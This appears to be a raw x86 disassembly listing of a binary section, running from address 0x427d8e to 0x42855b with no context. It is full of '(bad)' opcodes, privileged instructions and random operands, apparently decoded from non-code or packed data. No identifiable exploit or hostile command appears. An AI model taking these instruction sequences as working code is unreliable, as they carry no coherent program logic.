  427d8e:	jno    0x427dbf
  427d90:	cwde   
  427d91:	sbb    eax,0xb113da85
  427d96:	repnz fimul WORD PTR [ecx]
  427d99:	fsub   QWORD PTR [ebx]
  427d9b:	push   ebp
  427d9c:	loopne 0x427dc1
  427d9e:	adc    ebp,DWORD PTR [edi]
  427da0:	jle    0x427dee
  427da2:	mov    esp,0xe04a0001
  427da7:	xlat   BYTE PTR ds:[ebx]
  427da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427da9:	cmc    
  427daa:	push   ds
  427dab:	pushf  
  427dac:	clc    
  427dad:	hlt    
  427dae:	push   esp
  427daf:	pop    eax
  427db0:	std    
  427db1:	sbb    ebp,DWORD PTR [edi-0x4f461d89]
  427db7:	cmp    DWORD PTR [edx],esp
  427db9:	fist   WORD PTR [esi-0x66]
  427dbc:	inc    esi
  427dbd:	jo     0x427dfb
  427dbf:	or     edx,DWORD PTR [eax-0x35e41b1]
  427dc5:	outs   dx,DWORD PTR ds:[esi]
  427dc6:	inc    edi
  427dc7:	cld    
  427dc8:	(bad)  
  427dc9:	adc    bh,cl
  427dcb:	push   eax
  427dcc:	dec    DWORD PTR [esi]
  427dce:	(bad)  
  427dcf:	mov    ebx,0x106ca20e
  427dd4:	mov    dh,ch
  427dd6:	mov    cl,BYTE PTR [esi-0x71]
  427dd9:	sahf   
  427dda:	push   edi
  427ddb:	sbb    BYTE PTR [si],0xd1
  427ddf:	or     ecx,edi
  427de1:	pop    es
  427de2:	mov    bl,0x9
  427de4:	jge    0x427e45
  427de6:	imul   eax,eax,0x26740f82
  427dec:	test   BYTE PTR [ebx+esi*8-0x12],0xe3
  427df1:	scas   al,BYTE PTR es:[edi]
  427df2:	add    eax,DWORD PTR [ebx+esi*1]
  427df5:	out    dx,al
  427df6:	mov    eax,ds:0xd6bd6000
  427dfb:	jno    0x427e64
  427dfd:	icebp  
  427dfe:	push   edi
  427dff:	test   BYTE PTR [ebp+0x58],dl
  427e02:	loop   0x427d99
  427e04:	pusha  
  427e05:	cs mov ebp,fs
  427e08:	and    DWORD PTR [eax+0x42],eax
  427e0b:	mov    ah,0x22
  427e0d:	mov    edx,0xe79243bd
  427e12:	pop    esp
  427e13:	mov    edx,0xf8f9aae3
  427e18:	push   edx
  427e19:	clc    
  427e1a:	and    al,0xf0
  427e1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e1d:	jno    0x427e66
  427e1f:	jne    0x427e0f
  427e21:	jg     0x427e1f
  427e23:	xchg   esi,eax
  427e24:	cmp    BYTE PTR [edx+0xf],0xa0
  427e28:	fdivp  st(1),st
  427e2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e2b:	sar    BYTE PTR [edx],cl
  427e2d:	stos   BYTE PTR es:[edi],al
  427e2e:	mov    ebx,0x10e68e60
  427e33:	pop    esp
  427e34:	push   0xffffffec
  427e36:	popf   
  427e37:	dec    ebp
  427e38:	sbb    eax,0xa50107c1
  427e3d:	aam    0x58
  427e3f:	sar    dh,0x18
  427e42:	rol    BYTE PTR [edi],0x56
  427e45:	push   ebp
  427e46:	add    al,0x2c
  427e48:	inc    ebp
  427e49:	push   ebp
  427e4a:	ds hlt 
  427e4c:	clc    
  427e4d:	or     ah,BYTE PTR [ebp+edi*8-0x5595eed5]
  427e54:	es vmread esi,edx
  427e58:	bnd je 0x427ead
  427e5b:	popa   
  427e5c:	js     0x427e6d
  427e5e:	sbb    ch,BYTE PTR [ecx]
  427e60:	mov    ebx,?
  427e62:	pop    edx
  427e63:	push   edi
  427e64:	cmp    BYTE PTR [ebx-0x36b5faf0],bl
  427e6a:	push   ebp
  427e6b:	and    eax,0xcaa122dc
  427e70:	jmp    0x427ed0
  427e72:	push   ebp
  427e73:	pushf  
  427e74:	mov    ebp,0xc2671a94
  427e79:	xchg   ebx,eax
  427e7a:	sub    eax,0x5dbb3db8
  427e7f:	dec    esp
  427e80:	or     ah,BYTE PTR [ecx]
  427e82:	xchg   ebp,eax
  427e83:	xchg   ebp,eax
  427e84:	btr    DWORD PTR [edx+0x625ac736],esp
  427e8b:	and    ebp,esp
  427e8d:	dec    edi
  427e8e:	repz js 0x427e11
  427e91:	mov    DWORD PTR [edi+0x17aff6f4],eax
  427e97:	pop    esi
  427e98:	outs   dx,DWORD PTR ds:[esi]
  427e99:	lea    edi,[eax-0x68]
  427e9c:	fiadd  WORD PTR [eax]
  427e9e:	jmp    0x427e2d
  427ea0:	scas   eax,DWORD PTR es:[edi]
  427ea1:	sub    eax,0x46eaf203
  427ea6:	int    0x3
  427ea8:	cwde   
  427ea9:	icebp  
  427eaa:	ret    
  427eab:	mov    eax,ds:0x255f9548
  427eb0:	sbb    edi,DWORD PTR [bp+di+0x78]
  427eb4:	mov    bl,BYTE PTR [eax+0x3]
  427eb7:	jmp    0x427e57
  427eb9:	je     0x427e94
  427ebb:	inc    edi
  427ebc:	xchg   DWORD PTR [edi],esp
  427ebe:	cmp    al,0x56
  427ec0:	cmp    eax,0xfd1eac8c
  427ec5:	xchg   DWORD PTR [edx],eax
  427ec7:	arpl   WORD PTR [esi+ecx*1+0x263c4fea],dx
  427ece:	push   eax
  427ecf:	adc    bl,0x95
  427ed2:	inc    edi
  427ed3:	fs mov ecx,0xc0e925d7
  427ed9:	mov    al,ds:0x385dfcf4
  427ede:	cmp    ecx,DWORD PTR [ecx]
  427ee0:	xor    eax,0xd5464db6
  427ee5:	lock pop edx
  427ee7:	and    DWORD PTR [esi],ecx
  427ee9:	push   0xffffffa4
  427eeb:	or     DWORD PTR [ebp+0x452b42f3],eax
  427ef1:	push   ss
  427ef2:	setge  dl
  427ef5:	or     esp,DWORD PTR [eax+eax*1-0x534fd52e]
  427efc:	pop    edi
  427efd:	mov    eax,ds:0x52c192a9
  427f02:	data16 data16 int3 
  427f05:	rol    DWORD PTR [ebx+0xa],1
  427f08:	scas   al,BYTE PTR es:[edi]
  427f09:	data16 mov al,ds:0x1c62086e
	...
  427f17:	add    BYTE PTR [eax],al
  427f19:	add    BYTE PTR [edx-0x107ddbc],bl
  427f1f:	(bad)  
  427f20:	fisub  DWORD PTR [esi-0x37]
  427f23:	and    dh,BYTE PTR [ecx+edx*1+0x8]
  427f27:	and    ebx,DWORD PTR [ebp-0x5d]
  427f2a:	pop    ebp
  427f2b:	hlt    
  427f2c:	add    DWORD PTR [eax],eax
  427f2e:	std    
  427f2f:	add    DWORD PTR [eax],eax
  427f31:	add    cl,ah
  427f33:	push   ss
  427f34:	sub    BYTE PTR [ecx+edx*8+0x24],al
  427f38:	dec    ebp
  427f39:	xor    DWORD PTR [ecx+0x5d],esi
  427f3c:	sbb    DWORD PTR [esi+0x2a],0x3
  427f40:	sar    DWORD PTR [ecx-0x64],1
  427f43:	push   ecx
  427f44:	adc    al,0xac
  427f46:	js     0x427f29
  427f48:	lea    ebp,[ebx+ecx*1+0x2]
  427f4c:	jne    0x427fa4
  427f4e:	jle    0x427f13
  427f50:	mov    esp,0x6bfee4e
  427f55:	xchg   ebp,eax
  427f56:	push   ds
  427f57:	arpl   WORD PTR [edi+0x49],di
  427f5a:	je     0x427fb1
  427f5c:	cmp    eax,0x33d6cb0f
  427f61:	adc    ebx,DWORD PTR [ecx]
  427f63:	mov    bh,0xbb
  427f65:	std    
  427f66:	sub    DWORD PTR [eax+ebp*8+0x42520c7a],0x72bceb67
  427f71:	leave  
  427f72:	sbb    bl,BYTE PTR [edx+ebp*1-0x3d8ca86d]
  427f79:	arpl   WORD PTR [edx-0x6a3ce54],si
  427f7f:	mov    edx,0x9d16e534
  427f84:	and    BYTE PTR [ebp-0x4],ch
  427f87:	inc    esi
  427f88:	xor    ecx,DWORD PTR [ebp-0xf]
  427f8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f8c:	daa    
  427f8d:	mov    edi,0x42aa47e2
  427f92:	pop    ss
  427f93:	por    mm7,QWORD PTR [esi-0xd299c42]
  427f9a:	cmc    
  427f9b:	ret    
  427f9c:	hlt    
  427f9d:	mov    esp,0x8604f0fb
  427fa2:	cs (bad) 
  427fa4:	pop    ds
  427fa5:	cs jecxz 0x427f3a
  427fa8:	push   ebx
  427fa9:	jecxz  0x427fd2
  427fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427fac:	push   0x800894d8
  427fb1:	mov    WORD PTR [esi],ds
  427fb3:	and    al,0x58
  427fb5:	xchg   esp,eax
  427fb6:	adc    ch,BYTE PTR [ecx-0x417977]
  427fbc:	jmp    0x8904:0x49554734
  427fc3:	add    ebp,DWORD PTR [edx+0x83909e]
  427fc9:	fwait
  427fca:	xchg   esp,eax
  427fcb:	mov    al,ds:0xfba92c51
  427fd0:	xor    dl,dh
  427fd2:	mov    ecx,0xf7d13169
  427fd7:	xor    dh,BYTE PTR [esi]
  427fd9:	call   ebp
  427fdb:	hlt    
  427fdc:	mov    ds:0xc15b7f5b,eax
  427fe1:	sub    esp,DWORD PTR [ecx]
  427fe3:	push   esp
  427fe4:	xor    edi,DWORD PTR [edx-0x32]
  427fe7:	add    eax,0x927642d8
  427fec:	push   0xffffff9d
  427fee:	mov    al,0x6e
  427ff0:	and    eax,0xab93941f
  427ff5:	mov    ch,0x2e
  427ff7:	mov    bh,0x1f
  427ff9:	imul   edx,ebp,0x49e24786
  427fff:	jbe    0x42805e
  428001:	sbb    edi,edx
  428003:	and    ax,0xb53f
  428007:	pushf  
  428008:	adc    esi,DWORD PTR [edi+0x36]
  42800b:	jae    0x42804a
  42800d:	popa   
  42800e:	icebp  
  42800f:	xor    BYTE PTR [eax],0x6
  428012:	cli    
  428013:	scas   al,BYTE PTR es:[edi]
  428014:	jmp    0x42fe:0x26d0b9e1
  42801b:	pusha  
  42801c:	hlt    
  42801d:	push   es
  42801e:	xchg   ebp,eax
  42801f:	xchg   ah,ch
  428021:	ror    BYTE PTR [esi+edx*2],1
  428024:	push   ecx
  428025:	(bad)  
  428026:	test   eax,0x7c0ea56b
  42802b:	rol    BYTE PTR [edi+0x5f23cd7b],1
  428031:	jmp    0x151050f
  428036:	sbb    BYTE PTR [ebx],bh
  428038:	scas   al,BYTE PTR es:[edi]
  428039:	push   edx
  42803a:	pop    esi
  42803b:	lods   eax,DWORD PTR ds:[esi]
  42803c:	jns    0x42803b
  42803e:	ficom  DWORD PTR [esi]
  428040:	ins    BYTE PTR es:[edi],dx
  428041:	mov    ch,cl
  428043:	retf   
  428044:	mov    eax,ds:0x30c576cb
  428049:	mov    al,0x25
  42804b:	or     dl,BYTE PTR [ecx+0xafb3d06]
  428051:	pop    es
  428052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428053:	cdq    
  428054:	fistp  QWORD PTR ds:0xd4468b89
  42805a:	jecxz  0x4280ae
  42805c:	ror    DWORD PTR [edx-0x75],1
  42805f:	push   ebp
  428060:	and    BYTE PTR [ecx+eax*4-0x2cefe45c],0x13
  428068:	inc    ebx
  428069:	stos   BYTE PTR es:[edi],al
  42806a:	inc    ecx
  42806b:	(bad)  
  42806c:	jb     0x428044
  42806e:	sub    ch,BYTE PTR [ecx-0x6165b4d2]
  428074:	int    0x67
  428076:	jne    0x4280dd
  428078:	(bad)  
  428079:	(bad)  
  42807a:	cli    
  42807b:	jg     0x4280d3
  42807d:	(bad)  
  42807e:	out    0xf7,eax
  428080:	add    eax,0x51ccecc8
  428085:	scas   eax,DWORD PTR es:[edi]
  428086:	outs   dx,DWORD PTR ds:[esi]
  428087:	jl     0x428060
  428089:	das    
  42808a:	and    DWORD PTR [ebx],eax
  42808c:	xor    al,0x30
  42808e:	mov    ecx,0x50214a09
  428093:	add    eax,0xf3264ccf
  428098:	pop    ebp
  428099:	outs   dx,BYTE PTR ds:[esi]
  42809a:	and    al,0x52
  42809c:	xchg   DWORD PTR [eax+0x8d6f7e9],esi
  4280a2:	aas    
  4280a3:	push   esp
  4280a4:	xchg   bl,dl
  4280a6:	adc    eax,0xf427f189
  4280ab:	push   ecx
  4280ac:	mov    al,0xdf
  4280ae:	mov    esp,0x9f7b1655
  4280b3:	(bad)  
  4280b4:	out    0x90,al
  4280b6:	lahf   
  4280b7:	imul   edx,DWORD PTR [esi+eiz*2-0x503e7f07],0x61
  4280bf:	dec    edi
  4280c0:	shl    DWORD PTR [edx+0x58],0xb1
  4280c4:	sti    
  4280c5:	mov    esp,0x920e51b8
  4280ca:	int    0x9e
  4280cc:	retf   
  4280cd:	jnp    0x42808e
  4280cf:	sbb    eax,0xab6bbc59
  4280d4:	and    DWORD PTR [ebp+ebx*4-0x4c],ebp
  4280d8:	int3   
  4280d9:	cmp    DWORD PTR [eax+0x7f],ebp
  4280dc:	add    al,0x3a
  4280de:	mov    DWORD PTR [edi],eax
  4280e0:	and    BYTE PTR [ebx+0x30],bl
  4280e3:	mov    esp,DWORD PTR [esi-0x1c]
  4280e6:	sbb    BYTE PTR [eax+0x69fdbd4d],bh
  4280ec:	pop    ss
  4280ed:	add    DWORD PTR [edx+0x5091529d],ecx
  4280f3:	push   ss
  4280f4:	int3   
  4280f5:	jecxz  0x4280d7
  4280f7:	adc    ch,BYTE PTR [edi-0x26edf426]
  4280fd:	jns    0x4280dd
  4280ff:	xchg   ebp,eax
  428100:	xchg   ecx,eax
  428101:	pop    esi
  428102:	add    eax,0xb697f4d6
  428107:	and    esi,DWORD PTR [ebp+0x3e]
  42810a:	xchg   esi,eax
  42810b:	fist   WORD PTR [edx-0x79]
  42810e:	icebp  
  42810f:	mov    eax,ds:0xab028ad3
  428114:	aas    
  428115:	inc    edx
  428116:	stos   BYTE PTR es:[edi],al
  428117:	mov    ch,0x3c
  428119:	jl     0x42814f
  42811b:	hlt    
  42811c:	ins    BYTE PTR es:[edi],dx
  42811d:	pop    eax
  42811e:	xchg   ebp,eax
  42811f:	add    BYTE PTR [ebp+0x68f756e7],ah
  428125:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  428127:	test   bh,dl
  428129:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42812a:	push   edi
  42812b:	mov    bh,0x11
  42812d:	sub    BYTE PTR [eax+0x0],cl
	...
  428138:	add    BYTE PTR [eax],al
  42813a:	nop
  42813b:	stos   DWORD PTR es:[edi],eax
  42813c:	es ret 
  42813e:	aas    
  42813f:	iret   
  428140:	cmc    
  428141:	sti    
  428142:	pushf  
  428143:	and    al,0x28
  428145:	push   ebp
  428146:	nop
  428147:	inc    ecx
  428148:	cld    
  428149:	bound  ebx,QWORD PTR [edx-0xa]
  42814c:	add    DWORD PTR [eax],eax
  42814e:	std    
  42814f:	add    DWORD PTR [eax],eax
  428151:	add    bl,bh
  428153:	push   cs
  428154:	mov    ds:0x35bce4fc,al
  428159:	(bad)  
  42815a:	repz aaa 
  42815c:	sub    DWORD PTR [esi+edx*1-0x5],ebx
  428160:	jle    0x4281e0
  428162:	and    dh,BYTE PTR [edi-0x129c2dc1]
  428168:	sbb    BYTE PTR [eax+0x6d],al
  42816b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42816c:	cdq    
  42816d:	cs in  eax,dx
  42816f:	xor    dh,bh
  428171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428172:	fimul  WORD PTR [edx]
  428174:	ins    BYTE PTR es:[edi],dx
  428175:	push   esp
  428176:	adc    BYTE PTR [esi],bh
  428178:	pop    eax
  428179:	(bad)  
  42817a:	lock mov al,0x45
  42817d:	ror    DWORD PTR [ecx],1
  42817f:	mov    ecx,0xfbc33470
  428184:	mov    esi,0x4d0738f1
  428189:	jbe    0x4281b6
  42818b:	out    0xa0,al
  42818d:	add    eax,0x48b9da8f
  428192:	sub    BYTE PTR [ebx+0x17b7aa2d],ah
  428198:	inc    esi
  428199:	adc    cl,BYTE PTR [esi+0x13]
  42819c:	add    eax,0x5fe46829
  4281a1:	sti    
  4281a2:	shl    dl,1
  4281a4:	arpl   WORD PTR ds:0x7969ea99,bp
  4281aa:	test   BYTE PTR [eax-0x610bf459],ch
  4281b0:	xor    cl,BYTE PTR ds:0x5b6c94dc
  4281b7:	dec    ecx
  4281b8:	pop    ss
  4281b9:	inc    BYTE PTR [si]
  4281bc:	adc    eax,0x9b19ad8c
  4281c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281c2:	and    DWORD PTR [ebx-0x1c],0x855f56b
  4281c9:	pop    ebx
  4281ca:	adc    esp,DWORD PTR [eax+0x78]
  4281cd:	inc    esp
  4281ce:	or     al,0x6c
  4281d0:	sar    BYTE PTR [eax+0x6f],1
  4281d3:	sub    eax,0xea713a2c
  4281d8:	push   eax
  4281d9:	sub    DWORD PTR [edx],edi
  4281db:	rol    DWORD PTR [edi+0x2e],0x5b
  4281df:	jmp    0xdcb4:0xe05cb764
  4281e6:	push   es
  4281e7:	lea    ebx,[ebp-0x6903ca95]
  4281ed:	test   BYTE PTR [ebx-0x74],al
  4281f0:	cmp    al,0xa5
  4281f2:	rol    BYTE PTR ds:0xf95f68b,0xca
  4281f9:	mov    ebp,eax
  4281fb:	fsubr  DWORD PTR gs:[eax]
  4281fe:	outs   dx,DWORD PTR ds:[esi]
  4281ff:	or     BYTE PTR [edx-0x17b84bd7],cl
  428205:	jg     0x4281ac
  428207:	push   es
  428208:	and    BYTE PTR [eax],bh
  42820a:	xor    dh,ch
  42820c:	addr16 ss push 0x3e
  428210:	sub    ebp,DWORD PTR [ebx]
  428212:	scas   al,BYTE PTR es:[edi]
  428213:	out    dx,eax
  428214:	les    edi,FWORD PTR [ebx-0x1f]
  428217:	mov    gs,WORD PTR [edi+0x1b3e23d5]
  42821d:	loope  0x428246
  42821f:	mov    edi,0xbf2de246
  428224:	shl    DWORD PTR [ebp+0x35c8efb5],0xa8
  42822b:	jmp    0x428294
  42822d:	sbb    al,BYTE PTR [edi+0x39f72518]
  428233:	fmul   QWORD PTR [eax+0x60e56958]
  428239:	daa    
  42823a:	popf   
  42823b:	arpl   WORD PTR [eax-0xe],cx
  42823e:	popf   
  42823f:	mov    edx,0x9e92f583
  428244:	mov    cl,0x47
  428246:	mov    esi,0x51e9b095
  42824b:	and    eax,0x2238fc4f
  428250:	mov    eax,ds:0x4b08e40d
  428255:	push   ss
  428256:	mov    ch,0x87
  428258:	int3   
  428259:	mov    cl,0xb4
  42825b:	dec    ebx
  42825c:	inc    edi
  42825d:	adc    al,0x3c
  42825f:	xor    al,0x45
  428261:	test   DWORD PTR ds:0xff5beb30,edi
  428267:	lock xchg dh,ah
  42826a:	dec    ecx
  42826b:	(bad)  
  42826c:	pop    edi
  42826d:	cmp    BYTE PTR [edi],dl
  42826f:	jge    0x4282cf
  428271:	jns    0x428264
  428273:	sub    esi,DWORD PTR [ebp-0x75be9447]
  428279:	mov    ecx,0xa4881a86
  42827e:	adc    al,0xdf
  428280:	(bad)  
  428281:	clc    
  428282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428283:	pop    eax
  428284:	loopne 0x4282b7
  428286:	retf   0xe9f7
  428289:	mov    al,ds:0x246d8b45
  42828e:	ffree  st(0)
  428290:	jb     0x42829c
  428292:	enter  0x7698,0x71
  428296:	push   ebp
  428297:	loop   0x428221
  428299:	mul    DWORD PTR [edi+eax*8-0x7f]
  42829d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42829e:	in     eax,0x3c
  4282a0:	adc    DWORD PTR [edi],eax
  4282a2:	push   eax
  4282a3:	fcmovnb st,st(5)
  4282a5:	jge    0x4282dd
  4282a7:	aas    
  4282a8:	loope  0x42825a
  4282aa:	jno    0x4282d9
  4282ac:	pop    edi
  4282ad:	pop    ds
  4282ae:	and    ebx,edi
  4282b0:	fisubr WORD PTR [ebp-0x1a]
  4282b3:	push   ebx
  4282b4:	fcmove st,st(1)
  4282b6:	pushf  
  4282b7:	pop    edx
  4282b8:	or     BYTE PTR [ecx+0x29],0x4f
  4282bc:	jmp    0x4282b6
  4282be:	iret   
  4282bf:	pop    edx
  4282c0:	mov    gs,WORD PTR [eax+0x256a1a48]
  4282c6:	xchg   ebx,eax
  4282c7:	sahf   
  4282c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4282c9:	mov    edi,0xd4ca5425
  4282ce:	scas   eax,DWORD PTR es:[edi]
  4282cf:	inc    eax
  4282d0:	push   ecx
  4282d1:	mov    ecx,0x3c2a4535
  4282d6:	addr16 mov edi,0x6088e974
  4282dc:	mov    ebx,0x44ee53e8
  4282e1:	fbstp  TBYTE PTR [ebp-0x69]
  4282e4:	mov    ds:0xaec4b1e8,al
  4282e9:	sub    eax,0x1ce8f234
  4282ee:	dec    esi
  4282ef:	out    dx,eax
  4282f0:	sbb    BYTE PTR [esi-0x55aeca05],ah
  4282f6:	int    0x93
  4282f8:	adc    BYTE PTR [ebp+ebp*8+0x6ebbcf22],al
  4282ff:	sbb    BYTE PTR [ebp+0x3851ff9],bh
  428305:	mov    dl,0x96
  428307:	inc    ecx
  428308:	test   BYTE PTR [ebp-0x40dc6ebb],ch
  42830e:	sbb    dl,ah
  428310:	xor    BYTE PTR [esp+eiz*2+0x6f],0xe4
  428315:	gs sub al,0xac
  428318:	and    al,0xe0
  42831a:	push   cs
  42831b:	inc    esi
  42831c:	mov    dl,0xc3
  42831e:	stos   DWORD PTR es:[edi],eax
  42831f:	sbb    dl,bh
  428321:	shr    DWORD PTR [esi+0x40],0x8
  428325:	dec    edx
  428326:	inc    edx
  428327:	mov    dh,0xf9
  428329:	mov    ds:0x6e322786,eax
  42832e:	out    0xd0,al
  428330:	fnstsw WORD PTR [edx]
  428332:	fwait
  428333:	rcr    BYTE PTR [ebx],cl
  428335:	add    al,0xc5
  428337:	mov    ds:0x8f45f9b1,al
  42833c:	fst    QWORD PTR [esi+0x4]
  42833f:	outs   dx,DWORD PTR ds:[esi]
  428340:	pop    es
  428341:	sbb    DWORD PTR [ebx],ecx
  428343:	dec    dh
  428345:	pop    edx
  428346:	out    dx,al
  428347:	dec    esp
  428348:	lea    edi,ds:0x62bdbc7b
  42834e:	ja     0x428350
	...
  428358:	add    BYTE PTR [eax],al
  42835a:	std    
  42835b:	cmp    DWORD PTR ds:0xfd1cf514,esi
  428361:	stc    
  428362:	jl     0x428396
  428364:	stc    
  428365:	jne    0x4283cc
  428367:	shl    BYTE PTR [esi],cl
  428369:	dec    ebx
  42836a:	push   edi
  42836b:	clc    
  42836c:	add    DWORD PTR [eax],eax
  42836e:	jmp    0x1afd:0x43000001
  428375:	into   
  428376:	push   0xf2980b08
  42837b:	(bad)  
  42837c:	jae    0x42831f
  42837e:	fcomip st,st(0)
  428380:	mov    ds:0xf65629ae,al
  428385:	add    eax,0x465c6d9b
  42838a:	test   eax,0x3f2765c
  42838f:	adc    BYTE PTR [ebp-0x6],cl
  428392:	xor    eax,0x29e24f71
  428397:	xchg   esi,eax
  428398:	rcr    BYTE PTR [esi+0x64],cl
  42839b:	call   0x9cdb:0xe9556064
  4283a2:	aas    
  4283a3:	cmp    ch,ah
  4283a5:	and    BYTE PTR [edx],dl
  4283a7:	neg    DWORD PTR [edi+0x4d]
  4283aa:	add    BYTE PTR [ebp-0x7e21f670],cl
  4283b0:	enter  0x2997,0x83
  4283b4:	int3   
  4283b5:	jbe    0x4283a6
  4283b7:	cmp    BYTE PTR [ebp+0x64],ah
  4283ba:	loope  0x428370
  4283bc:	call   0xb54e:0x4e2a06fb
  4283c3:	mov    ch,0xbe
  4283c5:	xchg   DWORD PTR [ebx],esi
  4283c7:	inc    eax
  4283c8:	loopne 0x42834e
  4283ca:	xchg   edi,eax
  4283cb:	out    dx,al
  4283cc:	rcr    DWORD PTR [edi+0xe],cl
  4283cf:	stos   BYTE PTR es:[edi],al
  4283d0:	mov    cl,0x78
  4283d2:	or     DWORD PTR ds:0x50c80fff,edi
  4283d8:	sti    
  4283d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283da:	mov    edi,0xff87fd7
  4283df:	jnp    0x428418
  4283e1:	adc    DWORD PTR [ecx+0x41541b3b],esp
  4283e7:	mov    ebx,0x68a387fb
  4283ec:	and    esp,edi
  4283ee:	test   al,0xde
  4283f0:	mov    ds:0xed01d25f,al
  4283f5:	daa    
  4283f6:	ret    0x8dc4
  4283f9:	xchg   ebp,eax
  4283fa:	adc    dl,BYTE PTR [ebx+ebp*2-0x42cfb844]
  428401:	stc    
  428402:	shr    cl,1
  428404:	mov    al,0x5
  428406:	leave  
  428407:	hlt    
  428408:	cdq    
  428409:	jae    0x42843b
  42840b:	sub    DWORD PTR [edi+0x7113759f],edi
  428411:	push   cs
  428412:	fwait
  428413:	pop    edi
  428414:	test   eax,0xc7fc333d
  428419:	xor    eax,0x78049c09
  42841e:	mov    dh,0x49
  428420:	pop    ds
  428421:	fs into 
  428423:	pop    ss
  428424:	call   0x3c92a34f
  428429:	mov    WORD PTR [eax+0x6db6f7d7],es
  42842f:	ficomp DWORD PTR [edx+0x69e4e144]
  428435:	and    ebx,DWORD PTR [eax+eiz*8+0xf00595e]
  42843c:	add    dh,BYTE PTR [eax+0x627d3864]
  428442:	out    0xb4,eax
  428444:	push   cs
  428445:	lahf   
  428446:	into   
  428447:	test   DWORD PTR [esi],0x20a360ea
  42844d:	xchg   ebp,eax
  42844e:	fisubr WORD PTR [esi-0x5d3bda78]
  428454:	xchg   esi,eax
  428455:	jns    0x428423
  428457:	(bad)  
  428458:	in     eax,0xc1
  42845a:	push   ecx
  42845b:	mov    ch,bh
  42845d:	rol    ch,1
  42845f:	and    edi,DWORD PTR [bx+di-0x61]
  428463:	jo     0x4284a0
  428465:	adc    dl,BYTE PTR [ecx]
  428467:	jecxz  0x428421
  428469:	stos   DWORD PTR es:[edi],eax
  42846a:	mov    ?,WORD PTR [edi-0x43]
  42846d:	sti    
  42846e:	cmp    al,0x79
  428470:	pop    esp
  428471:	addr16 xor cl,dh
  428474:	das    
  428475:	cmp    ebp,ecx
  428477:	pushf  
  428478:	in     al,0xc3
  42847a:	ja     0x42843a
  42847c:	mov    edx,0x61d85d31
  428481:	sar    DWORD PTR [ecx],1
  428483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428484:	inc    esi
  428485:	jns    0x4284dd
  428487:	stos   DWORD PTR es:[edi],eax
  428488:	mov    al,ds:0x17da7f4a
  42848d:	adc    edi,DWORD PTR [ebp-0x6d584ab3]
  428493:	fsub   QWORD PTR [ebx]
  428495:	pop    edx
  428496:	imul   esi,DWORD PTR [ebx],0xffffffd9
  428499:	cmp    eax,0x3d18498a
  42849e:	mov    esp,0x6c910319
  4284a3:	mov    bh,0x87
  4284a5:	loopne 0x4284ff
  4284a7:	(bad)  
  4284a8:	out    dx,al
  4284a9:	xchg   ebx,eax
  4284aa:	div    bl
  4284ac:	xor    eax,0x45afc7e2
  4284b1:	cwde   
  4284b2:	daa    
  4284b3:	test   BYTE PTR [eax],dh
  4284b5:	add    al,BYTE PTR [ebx-0x28]
  4284b8:	fwait
  4284b9:	jmp    0x21e4bff9
  4284be:	mov    edi,0x41500120
  4284c3:	lds    esi,FWORD PTR [esi+0x4b]
  4284c6:	dec    ebx
  4284c7:	inc    edi
  4284c8:	push   0x2
  4284ca:	aad    0x30
  4284cc:	dec    edx
  4284cd:	mov    dl,0xf3
  4284cf:	or     al,0x2a
  4284d1:	(bad)  
  4284d2:	aas    
  4284d3:	xlat   BYTE PTR ds:[ebx]
  4284d4:	daa    
  4284d5:	mov    eax,0x5f08e063
  4284da:	rol    BYTE PTR [ebp-0x6a4bb734],0xd0
  4284e1:	enter  0x27ef,0xa4
  4284e5:	es cwde 
  4284e7:	xchg   edx,eax
  4284e8:	xchg   esi,eax
  4284e9:	cld    
  4284ea:	sbb    BYTE PTR [eax+edi*8+0x8c52ef3],bl
  4284f1:	mov    ebp,0x5aef975d
  4284f6:	inc    ebp
  4284f7:	adc    dl,ch
  4284f9:	jg     0x42852f
  4284fb:	push   0x68
  4284fd:	loope  0x4284e7
  4284ff:	shr    BYTE PTR [eax],cl
  428501:	jo     0x4284e9
  428503:	xchg   edx,eax
  428504:	dec    edi
  428505:	xor    BYTE PTR [eax+0x55bbbb68],bl
  42850b:	push   ecx
  42850c:	sahf   
  42850d:	xor    eax,0x323ff997
  428512:	sub    DWORD PTR [ebx],ecx
  428514:	popfw  
  428516:	xchg   DWORD PTR [eax+0x22],edx
  428519:	aas    
  42851a:	imul   esp,DWORD PTR [ecx+0x6ad0c81a],0x4b
  428521:	xor    DWORD PTR [ecx+0x91462e2],ebp
  428527:	hlt    
  428528:	out    0x1e,al
  42852a:	in     eax,dx
  42852b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42852c:	ins    DWORD PTR es:[edi],dx
  42852d:	stos   BYTE PTR es:[edi],al
  42852e:	aas    
  42852f:	out    0x89,eax
  428531:	xchg   esi,eax
  428532:	push   cs
  428533:	sbb    ecx,edx
  428535:	cmp    BYTE PTR [ebx-0x3572009b],cl
  42853b:	cwde   
  42853c:	fwait
  42853d:	mov    dh,0xb9
  42853f:	(bad)  
  428540:	jne    0x42853a
  428542:	ds fwait
  428544:	and    eax,0xafa499a5
  428549:	jp     0x428541
  42854b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42854c:	(bad)  
  42854d:	sub    eax,0xc1dcae3e
  428552:	mov    esi,esp
  428554:	fwait
  428555:	sbb    DWORD PTR [ecx-0x435a4f58],edi
  42855b:	add    DWORD PTR [eax],eax
	...
